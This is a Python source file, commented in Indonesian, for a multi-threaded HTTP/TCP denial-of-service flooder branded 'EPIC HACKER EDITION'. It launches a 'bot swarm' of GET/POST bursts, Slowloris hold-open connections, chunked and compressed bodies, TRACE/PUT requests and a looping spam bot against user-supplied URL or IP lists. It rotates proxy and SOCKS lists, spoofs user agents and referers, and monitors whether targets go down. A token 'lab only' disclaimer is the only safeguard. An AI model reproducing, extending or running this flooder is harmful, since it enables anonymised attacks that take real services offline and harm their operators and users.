# TCP Flooder Lab Test - v4.0 EPIC HACKER EDITION + Bot Swarm + SPAMMER BOT
# âš ï¸ DISCLAIMER: Gunakan hanya di lab/test server yang kamu kontrol sendiri
# ğŸ”¥ Ultimate Visual + 8 Bots + Spammer with Loop

import socket, random, threading, time, os, sys, json, ssl, zlib
import urllib.parse
from datetime import datetime
import urllib.request

useragents = [
    "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
    "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
    "Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
    "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
    "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
    "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0",
    "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
    "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
    "Mozilla/5.0 (Windows; U;; en-NZ) AppleWebKit/527 (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
    "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
    "Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"
]

ref = [
    'http://www.bing.com/search?q=',
    'https://www.yandex.com/yandsearch?text=',
    'https://duckduckgo.com/?q='
]

acceptall = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
    "Accept-Encoding: gzip, deflate\r\n",
    "Accept-Language: en-US,en;q=0.5\r\n"
]

# Definisi warna EPIC Cyberpunk Hacker Aesthetic
G = "\033[92m"   # Green Matrix
C = "\033[96m"   # Cyan Electric
O = "\033[38;5;208m"  # Orange
M = "\033[91m"   # Red Alert
K = "\033[93m"   # Yellow Warning
P = "\033[95m"   # Purple/Magenta
A = "\033[90m"   # Gray Shadow
W = "\033[97m"   # White Bright
B = "\033[1m"    # Bold
DIM = "\033[2m"  # Dim
U = "\033[4m"    # Underline
R = "\033[0m"    # Reset
BG_R = "\033[41m" # Background Red
BG_G = "\033[42m" # Background Green

def clear_screen():
    os.system("clear" if os.name != "nt" else "cls")

def print_slowly(text, delay=0.01):
    """Animasi print character by character"""
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def print_border(char="â•", length=80, color=C):
    """Print border dengan warna"""
    print(f"{color}{char * length}{R}")

def print_box(text, width=80, color=G):
    """Print text dalam box"""
    padding = width - len(text) - 4
    left_pad = padding // 2
    right_pad = padding - left_pad
    print(f"{color}â•‘{R} {' ' * left_pad}{B}{text}{R}{' ' * right_pad} {color}â•‘{R}")

def get_public_ip():
    """Deteksi IP public (support Tor/Proxychains)"""
    ip_services = [
        'https://api.ipify.org',
        'https://icanhazip.com',
        'https://ifconfig.me/ip',
        'https://ipinfo.io/ip',
        'http://checkip.amazonaws.com'
    ]
    
    for service in ip_services:
        try:
            req = urllib.request.Request(service, headers={'User-Agent': random.choice(useragents)})
            with urllib.request.urlopen(req, timeout=5) as response:
                ip = response.read().decode('utf-8').strip()
                return ip
        except:
            continue
    
    return "Unable to detect"

clear_screen()

# ===================== EPIC LOGO CYBERPUNK EDITION =====================
print_border("â•”", 80, P)
print(f"""{P}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—{R}""")

art_epic = f"""
{K}    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—      â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—{R}
{K}    â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—    â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â•šâ•â•â–ˆâ–ˆâ•”â•â•â•{R}
{O}    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   {R}
{O}    â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   {R}
{M}    â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•   â–ˆâ–ˆâ•‘   {R}
{M}    â•šâ•â•     â•šâ•â•â•â•â•â•â• â•šâ•â•â•â•â•â•  â•šâ•â•â•â•â•â• â•šâ•â•â•â•â•â•     â•šâ•â•â•â•â•â•  â•šâ•â•â•â•â•â•    â•šâ•â•   {R}
"""
print(art_epic)

print(f"{P}â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£{R}")
print_box(f"{G}â–ˆâ–“â–’â–‘ HYBRID FLOOD PROTOCOL v4.0 EPIC EDITION â–‘â–’â–“â–ˆ{R}", 80, P)
print_box(f"{C}SYSTEM INITIALIZED - 8 BOTS READY - SPAMMER ACTIVE{R}", 80, P)
print(f"{P}â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£{R}")

bot_list = [
    f"{G}[BOT-01]{R} {C}Alpha{R}     {DIM}â†’ GET burst attack{R}                              ",
    f"{G}[BOT-02]{R} {C}Bravo{R}     {DIM}â†’ POST JSON payload{R}                             ",
    f"{G}[BOT-03]{R} {C}Charlie{R}   {DIM}â†’ HEAD/OPTIONS fuzzing{R}                          ",
    f"{G}[BOT-04]{R} {C}Delta{R}     {DIM}â†’ Slowloris connection{R}                          ",
    f"{G}[BOT-05]{R} {C}Echo{R}      {DIM}â†’ Chunked encoding{R}                              ",
    f"{G}[BOT-06]{R} {C}Foxtrot{R}   {DIM}â†’ Compressed payload{R}                            ",
    f"{G}[BOT-07]{R} {C}Gamma{R}     {DIM}â†’ TRACE/PUT methods{R}                             ",
    f"{M}[BOT-08]{R} {M}{B}Spammer{R}   {DIM}â†’ {M}HTTP spam attack (1-4000 loop){R}                "
]

for bot in bot_list:
    print(f"{P}â•‘{R} {bot.ljust(88)} {P}â•‘{R}")

print(f"{P}â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£{R}")
print_box(f"{K}âš ï¸  WARNING: USE ONLY ON YOUR OWN LAB/TEST SERVERS âš ï¸{R}", 80, P)
print(f"{P}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•{R}")
print()

# ===================== USER INPUT SECTION =====================
print_border("â”€", 80, C)
print(f"{B}{G}[CONFIGURATION PANEL]{R}")
print_border("â”€", 80, C)

url_input = str(input(f'{G}[+]{R} Target URL/IP {DIM}(https://... or url.txt/ip.txt){R}: '))
pack = int(input(f'{G}[+]{R} Packet/s {DIM}(how many packets per connection){R}: '))
thread_count = int(input(f'{G}[+]{R} Threads {DIM}(concurrent bots){R}: '))

# ===================== SPAMMER BOT CONFIGURATION =====================
print()
print_border("â”€", 80, M)
print(f"{B}{M}[SPAMMER BOT CONFIGURATION]{R}")
print_border("â”€", 80, M)
print(f"{M}Bot Spammer{R} akan membuka URL target secara berulang dengan loop 1-4000")

enable_spammer = str(input(f'{M}[?]{R} Aktifkan Bot Spammer? {C}(y/n){R}: ')).lower()
spammer_iterations = 0

if enable_spammer == 'y':
    while True:
        try:
            spam_choice = int(input(f'{M}[+]{R} Pilih spam count {DIM}(1-4000){R}: '))
            if 1 <= spam_choice <= 4000:
                spammer_iterations = spam_choice
                print(f"{G}[âœ“]{R} Bot Spammer aktif dengan {M}{spam_choice}{R} iterations dalam loop!")
                break
            else:
                print(f"{M}[!]{R} Nilai harus antara 1-4000!")
        except ValueError:
            print(f"{M}[!]{R} Input tidak valid!")
else:
    print(f"{K}[!]{R} Bot Spammer dinonaktifkan")

print_border("â”€", 80, C)
print()

# Load multi-target dari file
targets = []
if url_input.endswith(".txt"):
    try:
        with open(url_input,"r") as f:
            for line in f:
                line=line.strip()
                if not line: continue
                if line.startswith("http://") or line.startswith("https://"):
                    targets.append(line)
                else:
                    targets.append(f"ip://{line}")
        print(f"{G}[âœ“]{R} Loaded {len(targets)} targets from file")
    except Exception as e:
        print(f"{M}[âœ—]{R} Error membaca file: {e}")
        sys.exit(1)
else:
    if url_input.startswith("http://") or url_input.startswith("https://"):
        targets = [url_input]
    else:
        targets = [f"ip://{url_input}"]

# ===================== STATISTICS INITIALIZATION =====================
stats_global = {"sent":0,"hits":0,"fail":0,"error":0}
stats_bot = {}
stats_target = {t:{"sent":0,"hits":0,"fail":0,"error":0,"monitor":"UNKNOWN"} for t in targets}

bots = {
    "Alpha":"GET burst",
    "Bravo":"POST JSON",
    "Charlie":"HEAD/OPTIONS",
    "Delta":"Slowloris",
    "Echo":"Chunked",
    "Foxtrot":"Compressed",
    "Gamma":"TRACE/PUT",
    "Spammer":"HTTP Spam Loop"
}

# Inisialisasi semua bot
for bot in bots.keys():
    stats_bot[bot] = {"sent":0,"hits":0,"fail":0,"error":0}

# ===================== HELPER FUNCTIONS =====================
def rand_string(n=None):
    length = n if n else random.randint(5,200)
    return ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789",k=length))

def generate_headers(botname,target):
    headers = [
        "User-Agent: " + random.choice(useragents),
        "Referer: " + random.choice(ref) + target,
        "X-Bot-ID: " + botname,
        "X-Bot-Mode: " + bots[botname],
        "X-Custom-Payload: " + rand_string(),
        random.choice(acceptall)
    ]
    random.shuffle(headers)
    return "\r\n".join(headers) + "\r\n"

def generate_body_json():
    body = {"id":rand_string(6),"msg":rand_string(random.randint(5,20)),"flag":random.choice([True,False])}
    return json.dumps(body)

def generate_chunked_body():
    chunks=[]
    for _ in range(random.randint(2,5)):
        data=rand_string(random.randint(5,30))
        chunks.append(f"{len(data):X}\r\n{data}\r\n")
    chunks.append("0\r\n\r\n")
    return "".join(chunks)

def compressed_body():
    data=rand_string(200)
    return zlib.compress(data.encode())

def build_request(method,botname,host,path,target):
    headers=generate_headers(botname,target)
    if method=="GET":
        request_line=f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"; body=""
    elif method=="POST":
        request_line=f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"; body=generate_body_json()
    elif method=="CHUNKED":
        request_line=f"POST {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\n"; body=generate_chunked_body()
    elif method=="COMPRESS":
        request_line=f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
        body=compressed_body().decode('latin1','ignore'); headers+="Accept-Encoding: gzip\r\n"
    else: # HEAD/OPTIONS/TRACE/PUT
        request_line=f"{method} {path} HTTP/1.1\r\nHost: {host}\r\n"; body=""
    length=f"Content-Length: {len(body)}\r\nConnection: Keep-Alive\r\n"
    return request_line+headers+length+"\r\n"+body

# ===================== BOT SPAMMER FUNCTION =====================
def spammer_bot():
    """Bot khusus untuk spam buka web dengan loop"""
    global stats_global, stats_bot, stats_target
    
    loop_count = 0
    while True:
        for iteration in range(spammer_iterations):
            target = random.choice(targets)
            
            if target.startswith("ip://"):
                host = target.replace("ip://","")
                path = "/"
                tport = 80
            else:
                parsed = urllib.parse.urlparse(target)
                host = parsed.netloc if parsed.netloc else "127.0.0.1"
                path = parsed.path if parsed.path else "/"
                tport = 443 if parsed.scheme=="https" else 80
            
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                
                if not target.startswith("ip://") and tport == 443:
                    context = ssl.create_default_context()
                    s = context.wrap_socket(s, server_hostname=host)
                
                s.connect((host, tport))
                stats_global["hits"] += 1
                stats_bot["Spammer"]["hits"] += 1
                stats_target[target]["hits"] += 1
                
                # Send simple GET request
                request = f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
                request += generate_headers("Spammer", target)
                request += "Connection: close\r\n\r\n"
                
                s.send(request.encode(errors="ignore"))
                stats_global["sent"] += 1
                stats_bot["Spammer"]["sent"] += 1
                stats_target[target]["sent"] += 1
                
                # Try to receive response (to simulate real visit)
                try:
                    s.recv(1024)
                except:
                    pass
                
                s.close()
                
                # Progress indicator
                progress = f"[{iteration+1}/{spammer_iterations}]"
                print(f"{M}[SPAMMER]{R} {progress} â†’ {target[:50]} | Loop: {loop_count+1} | Sent={stats_bot['Spammer']['sent']} | Hits={stats_bot['Spammer']['hits']}")
                
                time.sleep(random.uniform(0.01, 0.1))
                
            except Exception as e:
                stats_global["error"] += 1
                stats_bot["Spammer"]["error"] += 1
                stats_target[target]["error"] += 1
                stats_global["fail"] += 1
                stats_bot["Spammer"]["fail"] += 1
                stats_target[target]["fail"] += 1
                try:
                    s.close()
                except:
                    pass
        
        loop_count += 1
        print(f"{M}{B}[SPAMMER]{R} Completed loop #{loop_count} - Restarting...")
        time.sleep(0.5)

import requests  # pastikan sudah install requests[socks]

# ===================== PROXY CONFIGURATION =====================
use_proxy = str(input(f'{G}[?]{R} Aktifkan Proxy dari proxy.txt? (y/n): ')).lower()
proxies = []
proxy_index = 0

if use_proxy == 'y':
    try:
        with open("proxy.txt","r") as pf:
            proxies = [line.strip() for line in pf if line.strip()]
        print(f"{G}[âœ“]{R} Loaded {len(proxies)} proxies from proxy.txt")
        print(f"{C}Format supported:{R} http://ip:port | https://ip:port | socks4://ip:port | socks5://ip:port")
    except Exception as e:
        print(f"{M}[âœ—]{R} Error membaca proxy.txt: {e}")
        proxies = []
else:
    print(f"{K}[!]{R} Proxy mode dinonaktifkan")

# ===================== MAIN BOT ATTACK FUNCTION =====================
# Tambahin dict global untuk nyimpen status code
status_counts = {}

def start(botname):
    global stats_global, stats_bot, stats_target, proxy_index, status_counts
    while True:
        target = random.choice(targets)
        if target.startswith("ip://"):
            host = target.replace("ip://","")
            path = "/"
            tport = 80
        else:
            parsed = urllib.parse.urlparse(target)
            host = parsed.netloc if parsed.netloc else "127.0.0.1"
            path = parsed.path if parsed.path else "/"
            tport = 443 if parsed.scheme=="https" else 80
        try:
            # === Proxy mode (HTTP/HTTPS/SOCKS) ===
            if use_proxy == 'y' and proxies:
                proxy = proxies[proxy_index % len(proxies)]
                proxy_index += 1
                try:
                    resp = requests.get(
                        target,
                        headers={'User-Agent': random.choice(useragents)},
                        proxies={'http': proxy, 'https': proxy},  # bisa http:// atau socks5://
                        timeout=5
                    )
                    status_code = resp.status_code

                    # catat status code ke dict global
                    status_counts[status_code] = status_counts.get(status_code, 0) + 1

                    stats_global["hits"]+=1; stats_bot[botname]["hits"]+=1; stats_target[target]["hits"]+=1
                    stats_global["sent"]+=1; stats_bot[botname]["sent"]+=1; stats_target[target]["sent"]+=1

                    # tentukan warna status code
                    if status_code == 200:
                        status_color = f"{B}{G}"   # bold green
                    elif 300 <= status_code < 400:
                        status_color = C           # cyan
                    elif 400 <= status_code < 500:
                        status_color = K           # yellow
                    elif 500 <= status_code < 600:
                        status_color = M           # red
                    else:
                        status_color = A           # gray

                    print(f"{C}[{botname} PROXY]{R} via {proxy} â†’ {target[:40]} | Status={status_color}{status_code}{R} | Sent={stats_bot[botname]['sent']} | Hits={stats_bot[botname]['hits']}")
                except Exception as e:
                    stats_global["fail"]+=1; stats_bot[botname]["fail"]+=1; stats_target[target]["fail"]+=1
                    print(f"{M}[FAIL PROXY]{R} {proxy} â†’ {e}")

            # === Direct mode (kode asli) ===
            else:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.settimeout(3)
                if not target.startswith("ip://") and tport==443:
                    context=ssl.create_default_context()
                    s=context.wrap_socket(s,server_hostname=host)
                s.connect((host,tport))
                stats_global["hits"]+=1; stats_bot[botname]["hits"]+=1; stats_target[target]["hits"]+=1

                if botname=="Alpha": method="GET"
                elif botname=="Bravo": method="POST"
                elif botname=="Charlie": method=random.choice(["HEAD","OPTIONS"])
                elif botname=="Delta": method="GET"
                elif botname=="Echo": method="CHUNKED"
                elif botname=="Foxtrot": method="COMPRESS"
                elif botname=="Gamma": method=random.choice(["TRACE","PUT"])
                else: method="GET"

                main_req=build_request(method,botname,host,path,target)
                s.send(main_req.encode(errors="ignore"))
                stats_global["sent"]+=1; stats_bot[botname]["sent"]+=1; stats_target[target]["sent"]+=1

                for _ in range(pack):
                    s.send(main_req.encode(errors="ignore"))
                    stats_global["sent"]+=1; stats_bot[botname]["sent"]+=1; stats_target[target]["sent"]+=1
                    time.sleep(random.choice([0.01,0.05,0.1,0.5,1.0]))

                if botname=="Delta": slowloris_attack(s,botname)
                s.close()

                # Print progress dengan warna per bot
                bot_color = G if botname in ["Alpha","Bravo","Charlie"] else C if botname in ["Delta","Echo"] else O
                print(f"{bot_color}[{botname.ljust(8)}]{R} â†’ {target[:40].ljust(40)} | Sent={str(stats_bot[botname]['sent']).ljust(6)} | Hits={str(stats_bot[botname]['hits']).ljust(6)} | Monitor={stats_target[target]['monitor']}")

        except Exception:
            stats_global["error"]+=1; stats_bot[botname]["error"]+=1; stats_target[target]["error"]+=1
            try: s.close()
            except: pass
            stats_global["fail"]+=1; stats_bot[botname]["fail"]+=1; stats_target[target]["fail"]+=1
            time.sleep(1)

def slowloris_attack(sock,botname):
    for _ in range(5):
        try:
            sock.send(f"X-KeepAlive-{rand_string(4)}: {rand_string(10)}\r\n".encode())
            time.sleep(random.uniform(1,3))
        except: break

# ===================== TARGET MONITOR =====================
def monitor_target(target,interval=5):
    if target.startswith("ip://"):
        host = target.replace("ip://","")
        tport = 80
    else:
        parsed = urllib.parse.urlparse(target)
        host = parsed.netloc if parsed.netloc else "127.0.0.1"
        tport = 443 if parsed.scheme=="https" else 80
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            start_t = time.time()
            s.connect((host, tport))
            latency = (time.time() - start_t) * 1000
            stats_target[target]["monitor"] = f"{G}UP ({latency:.2f}ms){R}"
            s.close()
        except:
            stats_target[target]["monitor"] = f"{M}DOWN{R}"
        time.sleep(interval)

# ===================== START SYSTEM =====================
print()
print_border("â•", 80, G)
print(f"{B}{G}[SYSTEM STARTING]{R}")
print_border("â•", 80, G)
print(f"{C}[âš¡]{R} Initializing monitors...")

# Jalankan monitor untuk semua target
for t in targets:
    th = threading.Thread(target=monitor_target, args=(t,))
    th.daemon = True
    th.start()
    time.sleep(0.1)

print(f"{G}[âœ“]{R} All monitors active")
print(f"{C}[âš¡]{R} Deploying bot swarm...")

# Jalankan bot swarm (7 bot pertama)
botnames = ["Alpha", "Bravo", "Charlie", "Delta", "Echo", "Foxtrot", "Gamma"]
for x in range(thread_count):
    botname = botnames[x % len(botnames)]
    thred = threading.Thread(target=start, args=(botname,))
    thred.daemon = True
    thred.start()
    time.sleep(0.05)

print(f"{G}[âœ“]{R} {thread_count} bot threads deployed")

# Jalankan Spammer Bot jika diaktifkan
if enable_spammer == 'y' and spammer_iterations > 0:
    print(f"{M}[âš¡]{R} Launching SPAMMER BOT...")
    spam_thread = threading.Thread(target=spammer_bot)
    spam_thread.daemon = True
    spam_thread.start()
    time.sleep(0.1)
    print(f"{M}{B}[âœ“] SPAMMER BOT ACTIVE - Loop mode with {spammer_iterations} iterations{R}")

print_border("â•", 80, G)
print(f"{B}{C}[ATTACK INITIATED - Press Ctrl+C to stop]{R}")
print_border("â•", 80, C)
print()

start_time = datetime.now()

# Deteksi IP public di awal
print(f"{C}[âš¡]{R} Detecting your public IP...")
my_public_ip = get_public_ip()
if "Unable" not in my_public_ip:
    print(f"{G}[âœ“]{R} Your IP: {P}{my_public_ip}{R}")
else:
    print(f"{K}[!]{R} IP detection failed (offline mode?)")
print()

# ===================== MAIN LOOP + SUMMARY =====================
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    end_time = datetime.now()
    duration = (end_time - start_time).total_seconds()
    
    clear_screen()
    print()
    print_border("â•", 80, M)
    print(f"{B}{M}[â›” ATTACK STOPPED - GENERATING REPORT]{R}")
    print_border("â•", 80, M)
    print()
    
    # ===================== GLOBAL SUMMARY =====================
    print(f"{B}ğŸ“Š GLOBAL SUMMARY{R}")
    print_border("â”€", 80, W)
    print(f"{G}â±ï¸  Duration:{R} {duration:.2f} seconds")
    print(f"{C}ğŸ“¤ Total Sent:{R} {stats_global['sent']:,}")
    print(f"{G}ğŸ¯ Total Hits:{R} {stats_global['hits']:,}")
    print(f"{K}âŒ Total Fail:{R} {stats_global['fail']:,}")
    print(f"{M}âš ï¸  Total Error:{R} {stats_global['error']:,}")
    
    if duration > 0:
        rps = stats_global['sent'] / duration
        print(f"{P}âš¡ Requests/sec:{R} {rps:.2f}")
    
    # Tampilkan IP yang digunakan
    ip_color = P if my_public_ip != "Unable to detect" else K
    tor_indicator = ""
    if my_public_ip != "Unable to detect":
        if not my_public_ip.startswith(("192.", "10.", "172.")):
            tor_indicator = f" {A}(via Proxy/Tor?){R}"
    print(f"{C}ğŸŒ My IP:{R} {ip_color}{my_public_ip}{R}{tor_indicator}")
    
    print()
    
    # ===================== STATUS CODE BREAKDOWN =====================
    if use_proxy == 'y' and proxies:
        print(f"{B}ğŸ“Š STATUS CODE BREAKDOWN{R}")
        print_border("â”€", 80, C)
        header_status = f"{B}{'Status Code'.ljust(15)} {'Count'.ljust(10)}{R}"
        print(header_status)
        print_border("â”€", 80, A)
        if 'status_counts' in globals():
            for code, count in status_counts.items():
                row_status = f"{G}{str(code).ljust(15)}{R} {str(count).ljust(10)}"
                print(row_status)
        else:
            print(f"{K}[!]{R} Tidak ada data status code")
        print()
    
    # ===================== BOT BREAKDOWN =====================
    print_border("â”€", 80, C)
    print(f"{B}ğŸ“Š BOT BREAKDOWN{R}")
    print_border("â”€", 80, C)
    
    header_bot = f"{B}{'Bot'.ljust(12)} {'Sent'.ljust(10)} {'Hits'.ljust(10)} {'Fail'.ljust(10)} {'Error'.ljust(10)}{R}"
    print(header_bot)
    print_border("â”€", 80, A)
    
    for bot, stat in sorted(stats_bot.items()):
        bot_color = M if bot == "Spammer" else G if stat['sent'] > 0 else A
        row_bot = f"{bot_color}{bot.ljust(12)}{R} {str(stat['sent']).ljust(10)} {str(stat['hits']).ljust(10)} {str(stat['fail']).ljust(10)} {str(stat['error']).ljust(10)}"
        print(row_bot)
    
    print()
    
    # ===================== TARGET BREAKDOWN =====================
    print_border("â”€", 80, C)
    print(f"{B}ğŸ“Š TARGET BREAKDOWN{R}")
    print_border("â”€", 80, C)
    
    header_target = f"{B}{'Target'.ljust(45)} {'Sent'.ljust(8)} {'Hits'.ljust(8)} {'Fail'.ljust(8)} {'Monitor'.ljust(15)}{R}"
    print(header_target)
    print_border("â”€", 80, A)
    
    for target, stat in stats_target.items():
        target_short = target[:45].ljust(45)
        row_target = f"{target_short} {str(stat['sent']).ljust(8)} {str(stat['hits']).ljust(8)} {str(stat['fail']).ljust(8)} {stat['monitor']}"
        print(row_target)
    
    print()
    print_border("â•", 80, G)
    print(f"{B}{G}[âœ“] Report generated successfully{R}")
    print(f"{DIM}Session ended at: {end_time.strftime('%Y-%m-%d %H:%M:%S')}{R}")
    print_border("â•", 80, G)
    print()
    
    sys.exit(0)

